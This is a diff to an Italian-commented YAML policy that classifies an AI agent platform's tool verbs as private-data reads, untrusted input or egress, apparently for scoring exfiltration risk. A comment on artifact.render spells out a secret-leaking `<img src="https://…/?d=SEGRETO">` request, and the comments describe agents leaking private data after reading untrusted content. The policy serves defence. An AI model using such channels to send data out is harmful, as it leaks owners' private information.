@@ -31,7 +31,38 @@
 #     coerentemente con la classificazione dell'issue (il web che si legge è
 #     il lato 2). L'egress via shell/`curl` non è classificabile affatto:
 #     è il motivo del flag `shell` separato.
-version: 1
+#
+# ⚠️ ATTENZIONE ai pattern: il match è per NAMESPACE o per VERBO ESATTO, non
+# glob. `_split()` riconosce solo `ns.*` e `*`: un pattern come
+# `packs.install_*` o `telegram.lease_*` NON matcha nulla — è un pattern morto
+# che sembra funzionare. I verbi vanno enumerati uno per uno.
+#
+# ── v2 (issue clodia-platform#104 §9, «correzione del catalogo») ────────────
+# La classificazione precedente era stata scritta sui nomi PRESUNTI dei verbi;
+# questa versione è riallineata all'elenco EFFETTIVO del gateway
+# (`clodia-tools/server/main.py`, `Tool(name=…)`). Correzioni:
+#   1. `fs.list_dir` non è lettura di dati privati (restituisce nomi e
+#      dimensioni dentro `allowed_paths`, mai contenuto) → eccezione;
+#   2. i connettori di terze parti (gcalendar, gdocs, trello, image, artifact,
+#      mcp, packs) non erano classificati affatto: un agente con SOLI quei
+#      verbi risultava 0/3 pur potendo esfiltrare;
+#   3. rimosse le eccezioni verso verbi INESISTENTI (`email.send_file`,
+#      `telegram.send_message`, `gdrive.create/write/put`);
+#   4. `telegram.lease_acquire/lease_release` sono controllo d'accesso a una
+#      chat, non lettura di contenuto → eccezione su entrambi i lati di lettura.
+#
+# Verbi deliberatamente in NESSUN lato (non è una dimenticanza):
+#   - `gdrive.rename`: scrittura di solo metadato, non legge contenuto e non
+#     ne fa uscire (`gdrive.move` invece sì: può spostare su uno Shared Drive);
+#   - scritture interne a Clodia (`topic.write_file`, `memory.put`, …) e verbi
+#     di sola introspezione locale (`packs.list`, `mcp.list`, `jobs.list`).
+#
+# Resta aperto (non deciso qui, vedi il PR di #104): i corpora di dominio
+# montati come MCP esterni — `normattiva.*`, `contabilita.*`, `sedia.*` — non
+# sono classificati. Sono letture di contenuto di terzi, quindi candidati a
+# `untrusted_input`; #102 ha però misurato i seed senza di essi, e cambiarli
+# qui sposterebbe i numeri di quello studio.
+version: 2
 
 private_data:
   # topic: contenuti, file e documenti dei canali dell'istanza
@@ -54,18 +85,36 @@ private_data:
   # nulla: sono classificati unicamente come egress)
   - email.*
   - -email.send
-  - -email.send_file
+  - -email.reply
   - telegram.*
   - -telegram.send
-  - -telegram.send_message
   - -telegram.send_file
+  # controllo d'accesso a una chat, non lettura di contenuto (#104 §9): un
+  # postino che acquisisce il lease non legge niente.
+  - -telegram.lease_acquire
+  - -telegram.lease_release
   - gdrive.*
   - -gdrive.upload
-  - -gdrive.create
-  - -gdrive.write
-  - -gdrive.put
   - -gdrive.share
   - -gdrive.mkdir
+  - -gdrive.move
+  - -gdrive.rename
+  # calendario, documenti e board dell'owner: lettura di dati privati. I verbi
+  # di sola scrittura verso il sistema di terzi sono esclusi e stanno in egress.
+  - gcalendar.*
+  - -gcalendar.create_event
+  - -gcalendar.update_event
+  - -gcalendar.delete_event
+  - gdocs.*
+  - -gdocs.create
+  - -gdocs.append_text
+  - -gdocs.replace_text
+  - trello.*
+  - -trello.create_card
+  - -trello.comment
+  - -trello.move_card
+  # CRM: anagrafiche e contatti sono dato privato (#104 §8, voce impiegato-tomato)
+  - leads.*
   # stato e configurazione dell'istanza (include credenziali e integrazioni)
   - settings.*
   - integrations.*
@@ -75,7 +124,12 @@ private_data:
   - runtime.*
   - workflows.*
   - logs.*
+  # `fs.list_dir` è l'unico verbo `fs.*` oggi ed è un FALSO POSITIVO: elenca
+  # nomi e dimensioni dentro `allowed_paths` dell'agente, non restituisce mai
+  # contenuto (#104 §9). Il namespace resta classificato perché un eventuale
+  # `fs.read_file` futuro sarebbe invece lettura vera.
   - fs.*
+  - -fs.list_dir
   # corpora indicizzati dell'istanza
   - rag.*
   - eu_corpus.*
@@ -112,11 +166,12 @@ untrusted_input:
   # posta e chat in ARRIVO: il mittente non è controllato
   - email.*
   - -email.send
-  - -email.send_file
+  - -email.reply
   - telegram.*
   - -telegram.send
-  - -telegram.send_message
   - -telegram.send_file
+  - -telegram.lease_acquire
+  - -telegram.lease_release
   # file e documenti caricati in un topic da chiunque (incluso AGENTS.md)
   - topic.open
   - topic.search
@@ -128,18 +183,33 @@ untrusted_input:
   # documenti esterni sincronizzati o indicizzati
   - gdrive.*
   - -gdrive.upload
-  - -gdrive.create
-  - -gdrive.write
-  - -gdrive.put
   - -gdrive.share
   - -gdrive.mkdir
+  - -gdrive.move
+  - -gdrive.rename
+  # eventi, documenti e card scritti da terzi (invitati, collaboratori del doc,
+  # membri della board): contenuto non controllato che entra nel contesto.
+  - gcalendar.*
+  - -gcalendar.create_event
+  - -gcalendar.update_event
+  - -gcalendar.delete_event
+  - gdocs.*
+  - -gdocs.create
+  - -gdocs.append_text
+  - -gdocs.replace_text
+  - trello.*
+  - -trello.create_card
+  - -trello.comment
+  - -trello.move_card
   - rag.*
   - eu_corpus.*
 
 egress:
   - email.send
-  - email.send_file
-  - telegram.send_message
+  # `email.reply` risponde in thread CON allegati locali: è uscita a tutti gli
+  # effetti e non era classificata affatto (trovato riallineando all'elenco
+  # reale dei verbi, #104 §9).
+  - email.reply
   - telegram.send_file
   - telegram.send
   # GitHub in scrittura: pubblica fuori da Clodia
@@ -171,10 +241,38 @@ egress:
   - settings.backup_run
   # drive esterno in scrittura/condivisione
   - gdrive.upload
-  - gdrive.create
-  - gdrive.write
-  - gdrive.put
   - gdrive.share
+  - gdrive.mkdir
+  # sposta un file anche su uno Shared Drive → il contenuto esce dal perimetro
+  - gdrive.move
+  # ── connettori di terze parti (#104 §9) ─────────────────────────────────
+  # Scritture verso sistemi non nostri: il contenuto attraversa il confine
+  # dell'istanza esattamente come una mail. Prima non erano in alcun lato, cioè
+  # un agente con SOLI questi verbi risultava 0/3 pur potendo esfiltrare.
+  - gcalendar.create_event
+  - gcalendar.update_event
+  - gcalendar.delete_event
+  - gdocs.create
+  - gdocs.append_text
+  - gdocs.replace_text
+  - trello.create_card
+  - trello.comment
+  - trello.move_card
+  # il prompt viene inviato alla API immagini del provider (OpenAI gpt-image)
+  - image.generate
+  # `artifact.render` scrive DENTRO Clodia (files/artifact.html) e sembrerebbe
+  # quindi non-egress per la regola generale. Lo è comunque: l'HTML viene
+  # renderizzato nel browser dell'owner e la CSP dell'iframe
+  # (clodia-web `ArtifactCanvas.svelte`) consente `img-src … https:` con
+  # `script-src 'unsafe-inline'`. Una `<img src="https://…/?d=SEGRETO">` parte.
+  # Il canale è la GET del browser, non la scrittura del file.
+  - artifact.render
+  # montare un MCP esterno / installare un pack significa introdurre verbi e
+  # codice non controllati: uscita potenziale arbitraria, resa permanente.
+  - mcp.add
+  - packs.import_url
+  - packs.install_npm
+  - packs.install_pip
 
 # Verbi che permettono di ALLARGARE la composizione del contesto: chi li ha
 # può portare nel canale agenti che non erano partecipanti. Il punteggio si
